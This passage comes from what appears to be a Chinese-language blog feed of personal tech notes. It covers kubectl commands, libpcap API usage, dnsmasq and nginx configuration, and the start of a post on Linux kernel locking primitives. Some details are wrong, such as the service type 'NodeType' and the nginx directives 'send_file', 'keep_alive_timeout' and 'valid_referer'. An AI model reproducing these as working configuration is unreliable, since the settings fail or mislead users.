class="code"><pre><code class="hljs bash"><span class="hljs-comment">#kubernetes常用命令</span><br>kubectl get nodes <span class="hljs-comment">#查看所有节点</span><br>kubectl get pod<span class="hljs-comment">#查看所有pod</span><br>kubectl describe pod <span class="hljs-variable">$&#123;podname&#125;</span><span class="hljs-comment">#查看指定pod的详细信息</span><br>kubectl delete pod <span class="hljs-variable">$&#123;podname&#125;</span> --force --grace-period=0<br>kubectl create -f <span class="hljs-variable">$&#123;yaml&#125;</span><span class="hljs-comment">#创建资源</span><br>kubectl apply -f <span class="hljs-variable">$&#123;yaml&#125;</span><br><span class="hljs-comment">#--force指定强制删除</span><br><span class="hljs-comment">#--grace-period指定资源回收周期</span><br>kubectl expose deployment deployment-1 --port=80 --<span class="hljs-built_in">type</span>=NodeType<span class="hljs-comment">#使用命令创建一个service</span><br>kubectl run mydemo --image=docker.io/nginx:alpine --replicas=2 --record<span class="hljs-comment">#使用命令创建一个deployment</span><br>kubectl rollout <span class="hljs-built_in">history</span> deployment mystaticweb<span class="hljs-comment">#查看历史版本</span><br>kubectl rollout undo deployment deployment-1 --to-revision=5<span class="hljs-comment">#回滚到指定历史版本</span><br>kubectl <span class="hljs-built_in">set</span> image deployment deployment-1 nginx=ubuntu/nginx:latest<span class="hljs-comment">#更新deployment的指定容器镜像版本</span><br><br></code></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>参考<a href="https://kubernetes.io/zh-cn/docs/">kubernetes官方文档</a></p>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libpcap的使用</title>
    <link href="/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="libpcap的基本使用"><a href="#libpcap的基本使用" class="headerlink" title="libpcap的基本使用"></a>libpcap的基本使用</h1><h4 id="1-获取网络接口"><a href="#1-获取网络接口" class="headerlink" title="1.获取网络接口"></a>1.获取网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">pcap_lookupdev</span><span class="hljs-params">(<span class="hljs-type">char</span> *error_buffer)</span>;<span class="hljs-comment">//获取本地网络接口(返回网络接口的名称)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_findalldevs</span><span class="hljs-params">(<span class="hljs-type">pcap_if_t</span> **alldevsp, <span class="hljs-type">char</span> *errbuf)</span>;<span class="hljs-comment">//查找本地所有的网络接口</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> <span class="hljs-title">pcap_if_t</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">char</span> *name;<span class="hljs-comment">/* name to hand to &quot;pcap_open_live()&quot; */</span><br><span class="hljs-type">char</span> *description;<span class="hljs-comment">/* textual description of interface, or NULL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> *<span class="hljs-title">addresses</span>;</span><br>bpf_u_int32 flags;<span class="hljs-comment">/* PCAP_IF_ interface flags */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">addr</span>;</span><span class="hljs-comment">/* address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">netmask</span>;</span><span class="hljs-comment">/* netmask for that address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">broadaddr</span>;</span><span class="hljs-comment">/* broadcast address for that address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">dstaddr</span>;</span><span class="hljs-comment">/* P2P destination address for that address */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_pkthdr</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ts</span>;</span>    <span class="hljs-comment">/* time stamp */</span><br>  bpf_u_int32 caplen;   <span class="hljs-comment">/* length of portion present */</span><br>  bpf_u_int32 len;      <span class="hljs-comment">/* length this packet (off wire) */</span><br>&#125;;<span class="hljs-comment">//抓到的包的结构</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_loop</span><span class="hljs-params">(handler,<span class="hljs-number">10</span>,capture_handler,<span class="hljs-literal">NULL</span>)</span>;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntoa</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> in_addr *addr)</span>;<span class="hljs-comment">//该函数返回的指针指向的地址空间是静态分配的,因此每次调用此函数后,后面的结果都会对上一次的结果进行覆盖</span><br><br></code></pre></td></tr></table></figure><h4 id="2-打开一个网络接口"><a href="#2-打开一个网络接口" class="headerlink" title="2.打开一个网络接口"></a>2.打开一个网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pcap_t</span>*  <span class="hljs-title function_">pcap_open_live</span><span class="hljs-params">(<span class="hljs-type">char</span> *device,<span class="hljs-type">int</span> snaplen,<span class="hljs-type">int</span> packet_count_limit,<span class="hljs-type">int</span> timeout_limit,<span class="hljs-type">char</span> *error_buffer)</span>;<span class="hljs-comment">//打开一个网卡获得一个抓包句柄</span><br><span class="hljs-comment">//device </span><br><span class="hljs-comment">//snaplen   </span><br><span class="hljs-comment">//packet_count_limit 最大抓取的包的数量</span><br><span class="hljs-comment">//int timeout_limit  设置包从内核缓冲区拷贝到用户区所等待的时间</span><br></code></pre></td></tr></table></figure><h4 id="3-编译过滤条件"><a href="#3-编译过滤条件" class="headerlink" title="3.编译过滤条件"></a>3.编译过滤条件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_compile</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *handler, <span class="hljs-keyword">struct</span> bpf_program *fp, <span class="hljs-type">char</span> *<span class="hljs-built_in">exp</span>, <span class="hljs-type">int</span> optimize, bpf_u_int32 netmask)</span>;<span class="hljs-comment">//编一个过滤条件</span><br><span class="hljs-comment">//handler 打开的网卡句柄</span><br><span class="hljs-comment">//fp 存储过滤条件指针</span><br><span class="hljs-comment">//optimize 是否进行优化</span><br><span class="hljs-comment">//netmask 网络地址</span><br></code></pre></td></tr></table></figure><h4 id="4-设置过滤器"><a href="#4-设置过滤器" class="headerlink" title="4.设置过滤器"></a>4.设置过滤器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_setfilter</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *p, <span class="hljs-keyword">struct</span> bpf_program *fp)</span>;<span class="hljs-comment">//设置过滤器</span><br><span class="hljs-comment">//p 打开网卡的句柄</span><br><span class="hljs-comment">//fp设置的过滤表达式</span><br></code></pre></td></tr></table></figure><h4 id="5-获取包信息"><a href="#5-获取包信息" class="headerlink" title="5.获取包信息"></a>5.获取包信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">u_char *<span class="hljs-title function_">pcap_next</span><span class="hljs-params">(device,&amp;packet)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_loop</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *p, <span class="hljs-type">int</span> cnt,pcap_handler callback, u_char *user)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*pcap_handler)</span><span class="hljs-params">(u_char *user, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *h,<span class="hljs-type">const</span> u_char *bytes)</span>;<br><span class="hljs-comment">//获取一个数据包</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dnsmasq配置教程</title>
    <link href="/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
    <url>/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一次dnsmasq配置过程"><a href="#记录一次dnsmasq配置过程" class="headerlink" title="记录一次dnsmasq配置过程"></a>记录一次dnsmasq配置过程</h1><h3 id="1-安装dnsmasq"><a href="#1-安装dnsmasq" class="headerlink" title="1.安装dnsmasq"></a>1.安装dnsmasq</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install dnsmasq<br></code></pre></td></tr></table></figure><h3 id="2-修改dnsmasq配置文件"><a href="#2-修改dnsmasq配置文件" class="headerlink" title="2.修改dnsmasq配置文件"></a>2.修改dnsmasq配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/dnsmasq.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cache-size=10240<span class="hljs-comment">#dns缓存记录大小</span><br>listen-address=192.168.0.5<span class="hljs-comment">#绑定的ip地址</span><br>addn-hosts=/etc/dnsmasq.hosts<span class="hljs-comment">#导入外部的dns解析数据</span><br>resolv-conf=/etc/dnsmasq.dnsmasq.conf<span class="hljs-comment">#指定上游dns服务器的文件</span><br></code></pre></td></tr></table></figure><h3 id="3-resolv-conf指定上游dns服务器可能不成功-未知原因"><a href="#3-resolv-conf指定上游dns服务器可能不成功-未知原因" class="headerlink" title="3.resolv-conf指定上游dns服务器可能不成功(未知原因)"></a>3.resolv-conf指定上游dns服务器可能不成功(未知原因)</h3><p>可以尝试修改&#x2F;etc&#x2F;init.d&#x2F;dnsmasq脚本</p><p>RESOLV-CONF&#x3D;&#x2F;etc&#x2F;resolv-dnsmasq.conf</p><h3 id="4-启动dns服务器"><a href="#4-启动dns服务器" class="headerlink" title="4.启动dns服务器"></a>4.启动dns服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start dnsmasq.service<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx使用教程</title>
    <link href="/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <url>/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="nginx使用教程"><a href="#nginx使用教程" class="headerlink" title="nginx使用教程"></a>nginx使用教程</h1><h3 id="1-什么是nginx"><a href="#1-什么是nginx" class="headerlink" title="1.什么是nginx?"></a>1.什么是nginx?</h3><p>nginx [engine x] 是 HTTP 和反向代理服务器、邮件代理服务器和通用 TCP&#x2F;UDP 代理服务器，最初由 Igor Sysoev 编写。 很长一段时间以来，它一直在许多负载很重的俄罗斯网站上运行，包括 Yandex、Mail.Ru、VK 和 Rambler。 根据 Netcraft 的数据，2022 年 5 月，nginx 服务或代理了 21.67% 最繁忙的网站。以下是一些成功案例：Dropbox、Netflix、Wordpress.com、FastMail.FM。</p><h3 id="2-如何部署安装nginx"><a href="#2-如何部署安装nginx" class="headerlink" title="2.如何部署安装nginx"></a>2.如何部署安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install -y nginx <span class="hljs-comment">#Ubuntu/Debian</span><br>sudo yum install -y nginx <span class="hljs-comment">#rhel/centos</span><br></code></pre></td></tr></table></figure><h3 id="3-nginx的结构"><a href="#3-nginx的结构" class="headerlink" title="3.nginx的结构"></a>3.nginx的结构</h3><h4 id="3-1-nginx的启动方式"><a href="#3-1-nginx的启动方式" class="headerlink" title="3.1.nginx的启动方式"></a>3.1.nginx的启动方式</h4><p>nginx一般以守护进程启动,一个nginx服务至少包含一个master进程和一个work进程,master为nginx的守护进程用于管理work进程,和work进程为nginx接受请求后实际处理请求的进程</p><pre><code class=" mermaid">graph LR;1((master nginx守护进程))--&gt;2((work1 工作进程1))1--&gt;3((work2 工作进程2))1--&gt;4((work3 工作进程3))</code></pre><h4 id="3-2-nginx的请求拦截器-重点"><a href="#3-2-nginx的请求拦截器-重点" class="headerlink" title="3.2.nginx的请求拦截器(重点)"></a>3.2.nginx的请求拦截器(重点)</h4><p>nginx的location请求拦截器,用于匹配连接请求,匹配成功后由该定义的资源路径以及返回方式处理并响应</p><p>nginx的location请求的匹配方式有以下几种</p><ul><li>1.完全匹配</li><li>2.非正则匹配</li><li>3.正则匹配</li><li>4.普通匹配</li></ul><p>优先级自上而下</p><h5 id="1-精确匹配"><a href="#1-精确匹配" class="headerlink" title="1.精确匹配"></a>1.精确匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">location = /get&#123;<br>root html;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello you get!&quot;</span>;<br>&#125;<br><span class="hljs-comment">#精确匹配一旦成功不会去尝试匹配别的匹配规则</span><br></code></pre></td></tr></table></figure><h5 id="2-非正则匹配"><a href="#2-非正则匹配" class="headerlink" title="2.非正则匹配"></a>2.非正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>location ^~&#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello,world&quot;</span>;<br>&#125;<br><span class="hljs-comment">#匹配成功后不会去尝试匹配正则规则</span><br></code></pre></td></tr></table></figure><h5 id="3-正则匹配"><a href="#3-正则匹配" class="headerlink" title="3.正则匹配"></a>3.正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">location ~ \*.php$/ &#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello,location&quot;</span>;<br>&#125;<br>location ~* \*.php$ &#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;  &quot;</span>;<br>&#125;<br><span class="hljs-comment">#~*为不区分大小写的正则匹配</span><br></code></pre></td></tr></table></figure><h5 id="4-普通匹配-最长字符匹配"><a href="#4-普通匹配-最长字符匹配" class="headerlink" title="4.普通匹配(最长字符匹配)"></a>4.普通匹配(最长字符匹配)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /get &#123;<br>root html;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-nginx的日志文件以及错误重定向"><a href="#3-3-nginx的日志文件以及错误重定向" class="headerlink" title="3.3.nginx的日志文件以及错误重定向"></a>3.3.nginx的日志文件以及错误重定向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">access_log logs/access.log notice format;<span class="hljs-comment">#设置访问日志的存储路径以及日志等级和记录的日志格式</span><br>error_log logs/error.log error;<span class="hljs-comment">#设置错误日志的存储路径和记录的日志格式</span><br><br>error_page 404...(错误代码) /50x.html(重定向的location的地址)(也可以自定一个重定向的url)<br></code></pre></td></tr></table></figure><h3 id="4-nginx配置文件"><a href="#4-nginx配置文件" class="headerlink" title="4.nginx配置文件"></a>4.nginx配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#常用的参数配置</span><br><br><span class="hljs-comment">#配置nginx启动的用户和用户组</span><br>user nobody;<br><br><span class="hljs-comment">#配置nginx为守护进程方式启动</span><br>daemon on;<br><br><span class="hljs-comment">#配置nginx的worker进程数(一般配置为cpu核心数)nginx至少包含一个master进程(nginx的守护进程用于管理worker进程)</span><br>worker_processes 1;<br><br><span class="hljs-comment">#配置nginx的错误日志的存放路径以及日志等级</span><br>error_log logs/error.log notice;<br><br><span class="hljs-comment">#配置events</span><br>&#123;<br>worker_connections 1024;<span class="hljs-comment">#设置每个worker进程最大支持的连接数(和操作系统允许打开最大的文件描述符也有关系)</span><br>use epoll;<span class="hljs-comment">#设置处理事件的io模型</span><br>&#125;<br><br><span class="hljs-comment">#配置web服务</span><br>http<br>&#123;<br><span class="hljs-comment">#包含媒体文件类型</span><br>include mime.types;<br><br><span class="hljs-comment">#设置nginx默认的返回数据类型</span><br>default_type application/octet-stream;<br><br><span class="hljs-comment">#设置日志格式模板,可以用于后面日志调用</span><br>log_format main <span class="hljs-string">&quot;<span class="hljs-variable">$remote_addr</span>:<span class="hljs-variable">$time_local</span>:<span class="hljs-variable">$remote_user</span>:<span class="hljs-variable">$request</span>:<span class="hljs-variable">$status</span> <span class="hljs-variable">$body_bytes_sent</span>&quot;</span>;<br><br><span class="hljs-comment">#使用linux内核提供的sendfile来传输数据(sendfile系统调用在两个文件描述符之间直接传递数据(完全在内核中操作)，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高，被称之为零拷贝。)</span><br>send_file on;<br><br><span class="hljs-comment">#(TCP_NOPUSH 是 FreeBSD 的一个 socket 选项，对应 Linux 的 TCP_CORK，Nginx 里统一用 tcp_nopush 来控制它，并且只有在启用了 sendfile 之后才生效。启用它之后，数据包会累计到一定大小之后才会发送，减小了额外开销，提高网络效率。)</span><br>tcp_nopush on;<br><br><span class="hljs-comment">#尽快发送(减小延迟,但是会增多io读取次数)</span><br>tcp_nodelay on;<br><br><span class="hljs-comment">#设置长连接的超时时间(长连接就是本来http一次完整的请求相应需要tcp三次握手四次挥手,长连接就是上一个处理完任务的连接先不进行释放,用于后续任务的再次数据收发,减少了响应时间,节省了网络资源)</span><br>keep_alive_timeout 65;<br><br><span class="hljs-comment">#开启压缩</span><br>gzip on;<br><span class="hljs-comment">#指定gzip的压缩的文件类型</span><br>gzip_types application/javascript;<br><span class="hljs-comment">#压缩等级(1-9)</span><br>gzip_comp_level 1;<br><span class="hljs-comment">#指定gzip压缩后nginx加上响应头Accept-Endcoing</span><br>gzip_vary on<br><br><span class="hljs-comment">#和操作系统有关系(一般使用默认即可)</span><br>gzip_buffers number size;<br><span class="hljs-comment">#指定http的协议版本</span><br>gzip_http_version 1.0|1.1;<br><br><span class="hljs-comment">#设置最小文件压缩的长度</span><br>gzip_min_length 1024;<br><br>valid_referer none|blocked|server_names|string....//指定是否有效的referercd<br><span class="hljs-comment">#设置是否对服务端返回的结构进行压缩</span><br>gzip_proxied off|expired|no-cache|no-store|private|no_last_modified|no_etag|auth|any;<br><span class="hljs-comment">#设置服务</span><br>server &#123;<br>listen 80;<span class="hljs-comment">#设置监听的端口</span><br>server_name localhost; <span class="hljs-comment">#服务端的名称(一般设置为域名)</span><br>location /&#123;<span class="hljs-comment">#请求拦截器</span><br>root html;<span class="hljs-comment">#资源的根目录(实际请求的目录为location目录加上根目录)</span><br><span class="hljs-comment">#alias html;#实际请求的目录为alias目录;</span><br>index index.html index.htm;<span class="hljs-comment">#设置主页的文件</span><br>&#125;<br><span class="hljs-comment">#location ~*^server#~代表后面的表达式为一个正则表达式(~*为不区分大小写的正则表达式)</span><br><span class="hljs-comment">#&#123;</span><br><span class="hljs-comment">#root html</span><br><span class="hljs-comment">#index index.php</span><br><span class="hljs-comment">#&#125;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux字符设备并发访问控制</title>
    <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="linux字符设备并发访问控制"><a href="#linux字符设备并发访问控制" class="headerlink" title="linux字符设备并发访问控制"></a>linux字符设备并发访问控制</h1><h3 id="1-使用原子变量"><a href="#1-使用原子变量" class="headerlink" title="1.使用原子变量"></a>1.使用原子变量</h3><h5 id="1-1-原子变量类型"><a href="#1-1-原子变量类型" class="headerlink" title="1.1.原子变量类型"></a>1.1.原子变量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> counter;<br>&#125;<span class="hljs-type">atomic_t</span>;<br></code></pre></td></tr></table></figure><h5 id="1-2-常用的api"><a href="#1-2-常用的api" class="headerlink" title="1.2.常用的api"></a>1.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">atomic_set</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v,<span class="hljs-type">int</span> i)</span>;<span class="hljs-comment">//设置原子变量的值</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">atomic_inc</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自加1</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">atomic_dec</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_inc_and_test</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自加1       </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_dec_and_test</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_sub_and_test</span><span class="hljs-params">(<span class="hljs-type">int</span> i,<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减i</span><br></code></pre></td></tr></table></figure><h3 id="2-使用自旋锁"><a href="#2-使用自旋锁" class="headerlink" title="2.使用自旋锁"></a>2.使用自旋锁</h3><h5 id="2-1-自旋锁类型"><a href="#2-1-自旋锁类型" class="headerlink" title="2.1.自旋锁类型"></a>2.1.自旋锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">spinlock_t</span> lock;<br></code></pre></td></tr></table></figure><h5 id="2-2-常用的api"><a href="#2-2-常用的api" class="headerlink" title="2.2.常用的api"></a>2.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//需包含头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/spinlock.h&gt;</span></span><br>spin_lock_init(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//初始化自旋锁</span><br>spin_lock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//获得自旋锁(成功立即返回),否则直到获得该自旋锁的进程释放该自旋锁</span><br>spin_trylock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//成功获得自旋锁立即返回,否则返回假</span><br>spin_unlock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//释放自旋锁</span><br></code></pre></td></tr></table></figure><h3 id="3-使用信号量"><a href="#3-使用信号量" class="headerlink" title="3.使用信号量"></a>3.使用信号量</h3><h5 id="3-1-信号量类型"><a href="#3-1-信号量类型" class="headerlink" title="3.1.信号量类型"></a>3.1.信号量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">sem_t</span> sem<br></code></pre></td></tr></table></figure><h5 id="3-2-常用的api"><a href="#3-2-常用的api" class="headerlink" title="3.2.常用的api"></a>3.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/semaphore.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sema_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem,<span class="hljs-type">int</span> val)</span>;<span class="hljs-comment">//初始化信号量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">down</span><span class="hljs-params">(<span 